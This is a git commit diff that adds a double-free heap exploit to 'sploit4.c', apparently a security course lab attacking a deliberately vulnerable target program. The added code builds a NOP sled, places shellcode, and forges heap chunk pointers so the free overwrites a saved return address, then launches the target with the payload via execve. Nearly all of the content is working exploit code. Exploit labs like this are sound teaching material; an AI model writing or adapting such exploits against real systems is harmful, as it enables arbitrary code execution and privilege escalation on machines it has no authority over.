bbcfbd844eb6a62d3b1bbb990f0453ae7eb7eb4c
zinnia11 <zinnia.nie@gmail.com>
2023-02-21 00:01:22 -0600

    recommitting sploit2 and sploit4

--- sploits/sploit4.c
+++ sploits/sploit4.c
@@ -11,7 +11,22 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  // double free
+
+  char instructions[2048];
+
+  // NOP instructions
+  memset(instructions, '\x90', 2048);
+
+  strncpy(instructions+2, "\xeb\x04\x75\xf8\xff\xbf", 6);
+  // shellcode
+  strncpy(instructions+1000-(strlen(shellcode)), shellcode, strlen(shellcode));
+  // left pointer of q, pointing to the beginning of the buffer, 0x8059478
+  strncpy(instructions+1528, "\x78\x94\x05\x08", 4);
+  // right pointer of q, pointing to return address location, 0xbffff674
+  strncpy(instructions+1532, "\x7c\xf6\xff\xbf", 4);
+
+  args[0] = TARGET; args[1] = instructions; args[2] = NULL;
   env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
